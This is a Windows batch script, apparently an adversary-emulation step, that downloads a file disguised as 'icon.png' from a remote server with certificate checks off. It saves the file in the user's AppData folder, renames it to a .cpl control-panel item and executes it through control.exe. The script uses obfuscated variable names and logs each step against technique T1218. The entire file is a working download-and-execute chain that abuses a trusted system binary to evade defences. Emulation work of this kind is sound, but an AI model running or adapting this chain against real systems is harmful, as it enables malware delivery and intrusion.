@echo off
SETLOCAL EnableDelayedExpansion

REM Placeholder constant declarations (random-named SET variables)
SET xYz123Ab=%APPDATA%\11427\c0345696
SET pQr456Cd=af230df9.txt
SET uVw789Ef=https://10.0.0.49/stage/2/icon.png?11427-7
SET gHi012Jk=BALAM-S2B
SET lMn345Op=11427
SET qRs678Tu=%PUBLIC%\\macula-simulations.log
SET vWx901Za=https://10.0.0.49

REM Cache timestamp once
for /f "tokens=1-4 delims=:.," %%a in ("%time%") do set tsvar=%date% %%a:%%b:%%c.%%d

REM ----- HEARTBEAT FETCH (with retries, max 5) -----
set download_ok=0
for /l %%i in (1,1,5) do (
    echo [!tsvar!][DEBUG][!gHi012Jk!][!lMn345Op!]: heartbeat_start>> "!qRs678Tu!" 2>nul
    curl -k -s -o "!xYz123Ab!\!pQr456Cd!" "!uVw789Ef!"
    if !errorlevel! equ 0 (
        set download_ok=1
        echo [!tsvar!][DEBUG][!gHi012Jk!][!lMn345Op!]: heartbeat_complete>> "!qRs678Tu!" 2>nul
        goto :download_done
    ) else (
        echo [!tsvar!][DEBUG][!gHi012Jk!][!lMn345Op!]: heartbeat_retry_%%i>> "!qRs678Tu!" 2>nul
        timeout /t 2 /nobreak >nul
    )
)
:download_done

REM ----- POSITION WORKING DIRECTORY -----
echo [!tsvar!][DEBUG][!gHi012Jk!][!lMn345Op!]: chdir_start>> "!qRs678Tu!" 2>nul
cd /d "!xYz123Ab!" >nul 2>&1
echo [!tsvar!][DEBUG][!gHi012Jk!][!lMn345Op!]: chdir_result=!errorlevel!>> "!qRs678Tu!" 2>nul

REM ----- RENAME TO .cpl -----
if %download_ok% equ 1 (
    FOR %%i IN ("!pQr456Cd!") DO set base_cpl=%%~ni
    ren "!pQr456Cd!" "!base_cpl!.cpl"
    echo [!tsvar!][DEBUG][!gHi012Jk!][!lMn345Op!]: rename_complete>> "!qRs678Tu!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!gHi012Jk!][!lMn345Op!]: download_failed_skip_rename>> "!qRs678Tu!" 2>nul
)

REM ----- LOLBIN INVOCATION (control.exe) -----
set result=FAIL
set error_msg=DOWNLOAD_FAILED
if %download_ok% equ 1 (
    echo [!tsvar!][DEBUG][!gHi012Jk!][!lMn345Op!]: controlexec_start>> "!qRs678Tu!" 2>nul
    control.exe "!xYz123Ab!\!base_cpl!.cpl"
    set cpl_exit=!errorlevel!
    echo [!tsvar!][DEBUG][!gHi012Jk!][!lMn345Op!]: controlexec_result=!cpl_exit!>> "!qRs678Tu!" 2>nul
    if !cpl_exit! equ 0 (
        set result=OK
        set error_msg=
    ) else (
        set result=FAIL
        set error_msg=EXITCODE=!cpl_exit!
    )
)

REM ----- LOGGING (TTP) -----
echo [!tsvar!][TTP][!gHi012Jk!][!lMn345Op!]: T1218^|System Binary Proxy Execution=!result!:!error_msg!>> "!qRs678Tu!" 2>nul

ENDLOCAL
exit /b 0